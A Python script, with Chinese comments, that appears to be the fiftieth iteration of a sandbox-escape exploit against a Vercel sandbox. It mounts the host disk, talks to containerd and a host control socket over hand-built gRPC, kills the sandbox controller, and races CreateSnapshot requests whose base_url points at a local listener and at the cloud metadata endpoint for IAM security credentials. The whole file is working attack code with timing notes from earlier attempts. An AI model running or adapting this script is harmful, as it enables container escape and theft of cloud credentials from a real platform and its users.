# -*- coding: utf-8 -*-
"""vda50: all=false Kill(只杀 sandboxctrl 主进程, guest exec 存活) + 连打 CreateSnapshot
v48/v49 教训: Tasks/Kill(all=true) 会连 guest 的 exec 进程一起杀 -> 用 all=false
sandboxctrl 主进程死后平台 ~5.8s 才回收 (v48 stoppedAt-kill 间隔) -> 窗口内连打
另: 先 try all=false; 若 drive 未释放, 再补发 all=true 的最后一击(此时 guest 已把日志落盘)
"""
import os, time, socket, ctypes, subprocess, threading, re, struct

OUT = '/vercel/sandbox/v50.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')
EXTRA = '/mnt/vdax/root/v50.out'


def log(s, flush_extra=True):
    line = '[%.3f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    if flush_extra:
        try:
            open(EXTRA, 'a', encoding='utf-8', errors='replace').write(line + '\n')
        except Exception:
            pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=4):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def curl_h2(sockpath, path, payload, t=4, ns='default'):
    try:
        tmp = '/vercel/sandbox/curl_req.bin'
        hdr = '/vercel/sandbox/curl_hdr.txt'
        open(tmp, 'wb').write(payload)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: application/grpc', '-H', 'TE: trailers']
        if ns:
            cmd += ['-H', 'containerd-namespace: %s' % ns]
        cmd += ['-D', hdr, '--data-binary', '@%s' % tmp, 'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 3)
        hdrtxt = ''
        try:
            hdrtxt = open(hdr, encoding='utf-8', errors='replace').read().replace('\n', ' ')[:150]
        except Exception:
            pass
        return r.returncode, r.stdout, hdrtxt, r.stderr
    except Exception as e:
        return -1, b'', '', str(e).encode()


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    return bytes([(field_no << 3) | 2, len(b)]) + b


def puint(field_no, v):
    out = bytearray([(field_no << 3) | 0])
    while v >= 0x80:
        out.append((v & 0x7f) | 0x80)
        v >>= 7
    out.append(v)
    return bytes(out)


def pbool(field_no, v):
    return bytes([(field_no << 3) | 0, 1 if v else 0])


LISTEN = []


def start_listener(port=18080, seconds=25):
    def run():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(('0.0.0.0', port))
            s.listen(32)
            s.settimeout(seconds)
            t_end = time.time() + seconds
            while time.time() < t_end:
                try:
                    c, addr = s.accept()
                    c.settimeout(3)
                    try:
                        data = c.recv(8192)
                        LISTEN.append((addr, data[:400]))
                    except Exception:
                        LISTEN.append((addr, b''))
                    c.close()
                except socket.timeout:
                    continue
            s.close()
        except Exception as e:
            LISTEN.append(('ERR', str(e).encode()))
    th = threading.Thread(target=run)
    th.daemon = True
    th.start()
    return th


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)
    try:
        open(EXTRA, 'w').close()
    except Exception:
        pass

    CS = '/mnt/vdax/run/cell/cell.sock'
    CD = '/mnt/vdax/run/containerd/containerd.sock'
    CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'

    cids = []
    base = '/mnt/vdax/run/containerd/io.containerd.runtime.v2.task/default'
    try:
        cids = sorted(os.listdir(base))
        log('task dirs: %s' % cids)
    except Exception as e:
        log('task dir ERR %s' % e)
    if not cids:
        rc, out, hdr, err = curl_h2(CD, '/containerd.services.containers.v1.Containers/List', grpc_env(b''), t=4)
        if out:
            for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
                cids.append(m.group().decode())
        log('list ids: %s (rc=%d hdr=%s)' % (cids, rc, hdr))
    if not cids:
        log('NO CONTAINERS - ABORT')
        log('V50D_DONE')
        f.close()
        return

    start_listener(18080, 25)
    time.sleep(1)

    # 1) all=false kill 主进程
    cid = cids[0]
    log('=== KILL(all=false) %s ===' % cid)
    rc, out, hdr, err = curl_h2(CD, '/containerd.services.tasks.v1.Tasks/Kill',
                                grpc_env(pstr(1, cid) + puint(3, 9)), t=4)
    log('kill1 rc=%d hdr=%s err=%r' % (rc, hdr, err[:80]))

    # 2) 连打 (guest 存活!)
    urls = ['s3://127.0.0.1:18080/b/k',
            's3://127.0.0.1:18080/test.bin',
            's3://169.254.169.254/latest/meta-data/b/k',
            's3://127.0.0.1:1/b/k',
            's3://172.31.0.2/b/k',
            's3://bucket.s3.amazonaws.com/key']
    hits = []
    n = 0
    t_start = time.time()
    while time.time() - t_start < 9:
        url = urls[n % len(urls)]
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        t0 = time.time()
        st, bd = rpc_unix(CS, CSP, body, t=3)
        dt = time.time() - t0
        short = bd[:160].replace('\n', ' ')
        log('snap#%d %-52s -> %s (%.3fs) | %s' % (n, url, st, dt, short), flush_extra=(n % 3 == 0))
        if 'in use' not in bd:
            hits.append((url, bd[:500]))
            log('*** DRIVE FREE: %s -> %s' % (url, bd[:500]))
            urls = ['s3://169.254.169.254/latest/meta-data/iam/security-credentials/',
                    's3://169.254.169.254/latest/meta-data/',
                    's3://127.0.0.1:18080/hit%d.bin' % n,
                    's3://169.254.169.254/1.0/meta-data/']
        n += 1
        time.sleep(0.08)
        if len(hits) > 10:
            break

    # 3) 若一直 in use, 补 all=true 最后一击 (先落盘)
    log('listener hits so far: %s' % LISTEN)
    log('final kill all=true')
    rc, out, hdr, err = curl_h2(CD, '/containerd.services.tasks.v1.Tasks/Kill',
                                grpc_env(pstr(1, cid) + puint(3, 9) + pbool(4, True)), t=4)
    log('kill2 rc=%d hdr=%s err=%r' % (rc, hdr, err[:80]))
    t_start = time.time()
    while time.time() - t_start < 4:
        body = '{"drive_id":"sandbox","base_url":"s3://127.0.0.1:18080/race%d.bin"}' % n
        t0 = time.time()
        st, bd = rpc_unix(CS, CSP, body, t=3)
        log('race#%d -> %s (%.3fs) | %s' % (n, st, time.time() - t0, bd[:160].replace('\n', ' ')))
        if 'in use' not in bd:
            log('*** RACE FREE: %s' % bd[:400])
        n += 1
        time.sleep(0.05)

    time.sleep(1)
    log('listener hits: %s' % LISTEN)
    log('V50D_DONE')
    f.close()


if __name__ == '__main__':
    main()
